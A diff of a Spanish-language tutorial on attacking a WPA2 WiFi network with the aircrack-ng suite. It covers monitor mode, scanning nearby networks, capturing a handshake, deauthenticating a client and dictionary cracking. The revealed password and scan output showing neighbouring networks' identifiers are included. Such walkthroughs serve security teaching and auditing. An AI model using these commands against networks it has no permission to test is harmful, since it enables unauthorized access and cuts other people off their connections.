@@ -28,10 +28,10 @@ Dentro de la salida extensa de este comando tenemos la categoria _Supported inte
 Una vez comprobado si la tarjeta es compatible, pasaremos a ponerla el modo monitor. 
 
 ```Aircrack-ng requiere ser ejecutado como root```
-```  Para los ejemplos de comandos se utilizará la interfaz wlan0, esto debe de ser cambiado según la interfaz```
+```  Para los ejemplos de comandos se utilizará la interfaz wlan1, esto debe de ser cambiado según la interfaz```
 
 
-    $ root@HowIsCoding:~$  airmon-ng check wlan0
+    $ root@HowIsCoding:~$  airmon-ng check wlan1
 
     Found 5 processes that could cause trouble.
     Kill them using 'airmon-ng check kill' before putting
@@ -53,63 +53,149 @@ Para matar estos procesos simplemente usamos la herramienta airmon-ng para matar
 
 Cuando tenemos los procesos que entraban en conflicto matados podemos pasar a poner la interfaz en modo monitor, para ello usaremos la misma herramienta:
 
-    $ airmon-ng start wlan0
+    $ airmon-ng start wlan1
 
     PHY	Interface	Driver		Chipset
 
-    phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+    phy0	wlan1		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 
-		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
-		(mac80211 station mode vif disabled for [phy0]wlan0)
+		(mac80211 monitor mode vif enabled for [phy0]wlan1 on [phy0]wlan1mon)
+		(mac80211 station mode vif disabled for [phy0]wlan1)
 
-Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el momo monitor se habilita la interfaz wlan0mon.
+Como podemos ver en la salida del comando airmon-ng se ha habilitado el modo monitor de nuestra tarjeta. Para operar con el momo monitor se habilita la interfaz wlan1mon.
 
 Podemos comprobar los canales Wifi en los que esta ecuchando nuestra tarjeta en modo monitor, para ello podemos usar el comando:
     
-    $ iwlist wlan0mon channel
+    $ iwlist wlan1mon channel
 
 Cuando hemos encontrado la red que queremos auditar (como se explicará en el siguiente apartado), podemos suministrar el canal como argumento opcional a airmon-ng, de la siguiente forma:
 
-    $ airmon-ng start wlan0 3
+    $ airmon-ng start wlan1 3
 
 
 
 Al igual que podemos poner la tarjeta en modo monitor, cuando terminemos de trabajar con ella debemos desactivarla, para ello airmon-ng nos permite desactivarlo haciendo uso del comando:
     
-    $ airmon-ng stop wlan0
+    $ airmon-ng stop wlan1
 
 
-## Escaneando redes wifi: airmon-ng
+## Escaneando redes wifi: airodump-ng
 
 Una vez con nuestra interfaz en modo monitor pasaremos a realizar un escaneo de todas las redes wifi que estan en nuestro entorno, para ello utilizaremos la herramienta _airodump-ng_
 
-    $ airodump-ng wlan0mon
+    $ airodump-ng wlan1mon
 
-        CH  2 ][ Elapsed: 36 s ][ 2019-01-07 14:58                                         
-                                                                                                                                                                
-    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-                                                                                                                                                                
-    00:14:5C:84:4D:42  -44       14        5    1   6  54 . WPA2 TKIP   PSK  wireless.py                                                                        
-    48:8D:36:BC:25:A2  -63       14        3    0   1  130  WPA2 CCMP   PSK  Orange-25A0                                                                        
-                                                                                                                                                                
-    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                   
-                                                                                                                                                                
-    48:8D:36:BC:25:A2  10:00:00:8A:95:26  -21    0 - 6e     0        4                                                                                           
+	CH 12 ][ Elapsed: 12 s ][ 2019-01-13 13:34                                         
+                                                                                             
+	 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                             
+	 AA:5D:17:03:35:FC  -41       33        0    0   7  54   WPA2 CCMP   PSK  RaspberryPI        
+	 7C:8B:CA:6C:85:80  -42       21      100   40   4   54  WPA2 CCMP   PSK  TP-Link_8580       
+	 A4:08:F5:E6:23:06  -57       13        0    0  11   54  WPA2 CCMP   PSK  vodafone2300       
+	 94:6A:B0:CB:6F:EA  -62       19       80    0   4   54  WPA2 CCMP   PSK  MiFibra-6FE8       
+	 F8:FB:56:28:37:01  -69        1        3    0   7   54  WPA2 CCMP   PSK  micasa             
+	 44:48:C1:0F:0B:01  -72        5        0    0  11   54  WPA2 CCMP   MGT  VECTORITC-CORPORATI
+	 78:29:ED:83:11:BF  -73        8        0    0  11   54  WPA2 CCMP   PSK  MOVISTAR_11BE      
+	 44:48:C1:0F:0B:00  -73        7        0    0  11   54  WPA2 CCMP   MGT  VECTORITC-COLABORAD
+	 44:48:C1:0F:0B:02  -73        7        0    0  11   54  OPN              VECTORITC-INVITADOS
+	 B0:4E:26:1D:93:57  -74        2        0    0   6   54  WPA2 CCMP   PSK  TP-Link_9358        
+	 EC:08:6B:AB:77:F0  -75        4        0    0   3   54  WPA2 CCMP   PSK  TP-LINK_77F0       
+	 F4:F2:6D:2C:58:99  -83        1        2    0   9   54  WPA2 CCMP   PSK  Ororo _EXT          
+	 F4:F2:6D:EC:C4:71  -83        0       22    0  10  -1   WPA              <length:  0>        
+	00:16:0A:13:DB:42  -85        5        0    0  11  54 . WPA2 CCMP   PSK  RAFAELA             
+                                                                                              
+	BSSID              STATION            PWR   Rate    Lost    Frames  Probe                    
+                                                                                              
+	7C:8B:CA:6C:85:80  10:02:B5:8A:95:26   -1    0e- 0      0      100                           
+	94:6A:B0:CB:6F:EA  7C:8B:CA:6C:85:81  -29    5e- 0e     0       76                           
+	F8:FB:56:28:37:01  E4:0E:EE:44:DF:24  -72    1e- 1      0        4                           
+	EC:08:6B:AB:77:F0  4C:74:03:70:7C:3A  -85    0 - 6      0        1                  
+
 ``` La terminología usada en el resultado de este comando esta explicada en el apartado anterior``
 
-Es necesario examinar el resultado de esta herramienta y explicar a groso modo su funcionamiento.
 
-Airodump-ng realizará un escaneo por todos los canales de radio referentes a las redes wifi, buscando las diferentes señales (ya que permite capturar paquetes mediante el modo monitor). También detecta los clientes que existen en esas redes, así como sus direcciones mac y los puntos de acceso a los que están conectados.
+Airodump-ng realizará un escaneo por todos los canales de radio referentes a las redes wifi e irá buscando las diferentes señales y los clientes conectados a la mismas.
 
-Con este resultado podemos enfocarnos en un determinado punto de acceso, sin embargo, podemos realizar una captura de todo el tráfico y almacenarla en un archivo _pcap_ para su posterior análisis con _Wireshark_ u otra herramienta.
+Este resultado nos será útil para identificar todas las señales wifi de nuestro entorno, así como los cientes conectados a estas. Tenemos que tener en cuenta que si un punto de acceso tiene clientes conectados, el proceso de obtención de la contraseña será más fácil de realizar.
 
-### Limitando el rago de búsqueda
 
-Como mencionamos en el apartado anterior, cuando ponemos la interfaz en modo monitor podemos especificar la escucha en determinados canales. Esto cobra sentido en este momento, cuando hemos encontrado la red wifi que queremos auditar, pasaremos a limitar el rango de captura de datos a este canal (reduciendo así en tráfico a analizar).
+### Limitando el rango de búsqueda
 
-Posteiormente podemos capturar información relevante exclusivamente al AP que nos interesa, especificando su dirección MAC(bssid) y Canal en el que emite podemos obtener mayor información de esta red, incluyendo el Handsake.
+En el anterior ejemplo estabamos haciendo una captura de todos los canales wifi, de forma que nuestra interfaz (en modo monitor) iba cambiando constantemente de canal para encontrar los clientes y puntos de acceso de cada canal.
 
-    $ airodump-ng --bssid 00:14:5C:84:4D:42 --essid wireless.py -c 6 -w wirelessPY wlan0mon
+Sin embargo, cuando estamos trabando con un objetivo en concretp tenemos que  capturar información  exclusivamente de dicho AP para ello tenemos que  especificar su dirección MAC(bssid) y Canal en el que emite podemos obtener mayor información de esta red, indicaremos también un fichero donde almacenar la información que capturemos, de forma que el handsake quede almacenado para posteior tratamiento.
 
-Este comando nos dará como resultado un paquete _cap_(wirelessPY.cap) para analizar posteriormente.
+	$ airodump-ng --bssid 7C:8B:CA:6C:85:80 -c 4 -w capture wlan1mon
 
+Este comando nos dará como resultado un paquete _cap_(capture.cap) para analizar posteriormente.
+
+Tenemos que esperar hasta que capturemos el handsake, es decir, tenemos que esperar hasta que un cliente se conecte al punto de acceso y por ende comience el proceso de autenticación descrito anteriormente.
+	
+	$ CH  4 ][ Elapsed: 30 s ][ 2019-01-13 13:46 ][ WPA handshake: 7C:8B:CA:6C:85:80              
+                                                                                             
+	 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                             
+	 7C:8B:CA:6C:85:80  -34  57      303    12529  816   4   54  WPA2 CCMP   PSK  TP-Link_8580   
+                                                                                             
+	 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                   
+                                                                                             
+	 7C:8B:CA:6C:85:80  CC:9F:7A:1D:02:27  -35    0e- 0e   108      317  TP-Link_8580             
+	 7C:8B:CA:6C:85:80  10:02:B5:8A:95:26  -42    0e- 6e     0    12360                           
+
+En este momento hemos obtenido el handsake referente al AP, de forma que podemos detener la captura de paquetes.
+
+## Generando tráfico Wifi: aireplay-ng
+
+aireplay-ng es una herramienta dentro de la suite que nos permite generar tráfico para posteiormente utilizarlo en el proceso de craking de contraseñas WEP o WPA PSK. 
+
+En nuestro caso, estamos trabajando en una red WPA PSK. Cuando encontramos un cliente conectado a esta red, el proceso de captura de handsake parece imposible (puesto que el handsake se obtiene durante el proceso de autenticación), por lo cual, tendríamos que esperar a que el cliente u otro nuevo se conecte, en este punto es donde entra en juego aireplay.
+
+Podemos enviar paquetes que permite desautenticar a los clientes de una red, dichos clietnes, posteriormente se verán obligados a conectarse y nosotros capturaremos el handsake.
+
+Con aireplay-ng podemos enviar diferente tipo de tráfico, sin embargo, como hemos mencionado en nuestro caso nos interesa desauntenticar al usuario, para ello usaremos:
+	
+	$ root@kali:~# aireplay-ng -0 0 -a 7C:8B:CA:6C:85:80 -c CC:9F:7A:1D:02:27 wlan1mon             
+	14:05:50  Waiting for beacon frame (BSSID: 7C:8B:CA:6C:85:80) on channel 4                   
+	14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [19|65 ACKs]       
+	14:05:51  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|58 ACKs]       
+	14:05:52  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|61 ACKs]       
+	14:05:53  Sending 64 directed DeAuth (code 7). STMAC: [CC:9F:7A:1D:02:27] [ 0|66 ACKs]       
+
+En este comando, estamos especificando los siguientes parámetros:
+
+* -0 0 --> Indicamos que es un ataque de desautenticación. Con 0 indicamos el intervalo de nvío, en este caso continuamente
+
+* -a --> Indicamos la dirección MAC del punto de acceso
+
+* -c --> Indicamos la dirección MAC del cliente para desautenticar
+
+Pasando un tiempo, el cliente será desautenticado y automaticamente intentará volver a conectarse (de forma manual o automática), será en ese momento donde podamos caputar el handsake.
+
+## Obteniendo la contraseña: aircrack-ng
+
+aircrack-ng es la herramienta que nos permite crackear la contraseña, podemos utilizar diferentes métodos, en este caso vamos a realizar un ataque por diccionario. Podemos utilizar otros métodos como cracking mediante gpu haciendo uso de herramientas como _pyrit_.
+
+	$ aircrack-ng -w passwordList capture-01.cap
+
+	                       Aircrack-ng 1.5.2 
+
+      [00:00:00] 2/1 keys tested (25.73 k/s) 
+
+      Time left: 0 seconds                                     200.00%
+
+                           KEY FOUND! [ $Afmin123 ]
+
+
+      Master Key     : E3 77 86 87 FB A3 E9 54 77 EC 16 11 56 50 F8 C0 
+                       D5 8B 37 2F 0E 16 A7 F1 38 A3 C9 E5 75 AB EE B7 
+
+      Transient Key  : 8D 67 66 D7 74 3D AD A5 76 08 83 91 3C 10 56 49 
+                       81 14 B7 68 95 51 3B 2D 2D 25 70 1D D9 31 73 D2 
+                       44 DE 8A 54 25 CA F9 AB B6 99 1A 9A 7E D3 D4 25 
+                       EC E3 C5 E3 BF 4B 9A 1E 52 48 37 68 DA 8F 32 30 
+
+      EAPOL HMAC     : 79 F3 A9 F9 FA CA 60 C6 4E 45 8C 3D B6 77 0C D2 
+
+Tras realizar el ataque, si este ha concluido satisfactoriamente, encontraremos la contraseña, así como las diferentes claves utilizadas durante el proceso.
+
+ 
